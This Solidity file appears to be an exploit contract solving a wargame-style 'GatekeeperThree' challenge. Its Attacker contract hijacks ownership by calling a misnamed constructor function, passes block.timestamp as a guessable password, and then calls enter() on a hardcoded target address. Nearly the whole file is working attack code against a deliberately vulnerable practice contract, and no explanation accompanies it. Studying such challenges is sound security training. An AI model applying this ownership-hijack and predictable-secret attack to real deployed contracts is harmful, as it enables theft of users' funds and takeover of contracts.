// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface SimpleTrick {
    function trickyTrick() external;
}

interface GatekeeperThree {
    function construct0r() external;

    function createTrick() external;
    function getAllowance(uint256 _password) external;

    function enter() external;
}

contract Attacker {
    GatekeeperThree to = GatekeeperThree(0x66b8C9608bE926b899236829Abfb2Ca36766eD85);

    function attack() public {
        to.construct0r();

        to.createTrick();
        to.getAllowance(block.timestamp);

        to.enter();
    }
}